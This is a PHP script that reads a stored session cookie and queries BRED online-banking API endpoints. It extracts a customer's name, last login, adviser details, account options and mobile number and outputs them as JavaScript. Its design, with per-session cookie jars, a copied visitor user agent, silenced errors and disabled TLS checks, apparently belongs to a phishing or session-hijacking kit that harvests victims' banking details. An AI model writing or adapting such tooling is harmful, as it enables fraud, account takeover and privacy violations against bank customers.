<?php
error_reporting(0);
set_time_limit(0);
session_start();
$cookie = $_SESSION['cookie'];

$start_time = time();

function curl_get($url, $http_headers=null) {
	global $cookie;
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	if($http_headers)
		curl_setopt($ch, CURLOPT_HTTPHEADER, $http_headers);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	curl_setopt($ch, CURLOPT_COOKIEFILE, realpath('./cookies/'.$cookie));
	curl_setopt($ch, CURLOPT_COOKIEJAR, realpath('./cookies/'.$cookie));
	return curl_exec($ch);
}

$urls = array(

	"client" => "https://www.bred.fr/transactionnel/v2/services/rest/User/user",
	"univers" => "https://www.bred.fr/transactionnel/services/applications/menu/getMenuUnivers",
	"agents" => "https://www.bred.fr/transactionnel/services/applications/agences/agents",
	"options" => "https://www.bred.fr/transactionnel/v2/services/applications/options/getOptions",
	//"menuPrefs" => "https://www.bred.fr/transactionnel/services/applications/menu/getMenu/prefs",
	"mobile" => "https://www.bred.fr/transactionnel/v2/services/applications/gestionTelephone/getNumeros/true"
	
); 

$http_headers = array(
	"Host: www.bred.fr",
	"Accept: application/json, text/plain, */*",
	"Accept-Language: en-US,en;q=0.5",
	"DNT: 1",
	"Connection: close",
	"Referer: https://www.bred.fr/transactionnel/v2/"
);

$months = array(
	"janvier",
	"février",
	"mars",
	"avril",
	"mai",
	"juin",
	"juillet",
	"août",
	"septembre",
	"octobre",
	"novembre",
	"décembre"
);

$user_data = array();
$user_infos = array();
foreach ($urls as $key => $url) {
	
	$data = curl_get($url, $http_headers);
	$user_data[$key] = json_decode($data, true);
	
	if($user_data[$key] == NULL || $user_data[$key]['erreur']['code'] !=0) {
		$data = curl_get($url, $http_headers);
		$user_data[$key] = json_decode($data, true);
	}
	if($user_data[$key] == NULL || $user_data[$key]['erreur']['code'] !=0)
		$user_infos[$key] = $user_data[$key] = null;
	
	//file_put_contents("dump/$key.json", $data);
}

if($user_data['client']) {
	
	$client_content = $user_data['client']['content'];
	// $user_infos['client']['fullname'] = $client_content['prenom']." ".$client_content['nom'];
	$user_infos['client']['firstname'] = $client_content['prenom'];
	$user_infos['client']['lastname'] = $client_content['nom'];
	
	$date = explode("-", $client_content['lastConnexion']);
	$date_str = $date[2]." ".$months[intval($date[1])-1]." ".$date[0];
	$time_str = implode(":", explode(".", $client_content['hourLastConnexion']));
	$user_infos['client']['lastConnexion'] = $date_str." à ".$time_str;
	$user_infos['client']['type'] = $client_content['univers'];
	
}

if($user_data['univers']) {
	
	$user_infos['univers'] = $user_data['univers']['content']['title'];	
}

if($user_data['agents']) {
	
	$agents_content = $user_data['agents']['content'][0];
	$user_infos['agents']['name'] = $agents_content['intitule'];
	$user_infos['agents']['agency'] = $agents_content['libellePEO'];
	$user_infos['agents']['phone'] = " ".implode(" ", str_split($agents_content['telFixe'], 2));
}

if($user_data['options']) {
	$user_infos['options'] = $user_data['options']['content'];
}

if($user_data['mobile']) {
	
	$user_infos['mobile'] = $user_data['mobile']['content']['numeroMobile'];
}

$load_time = time() - $start_time;
// header("Content-Type: application/json");
// echo(json_encode($user_data));
header("Content-Type: text/javascript");
echo("let userInfos = ".json_encode($user_infos).";");
echo("let loadTime = ".$load_time.";");

?>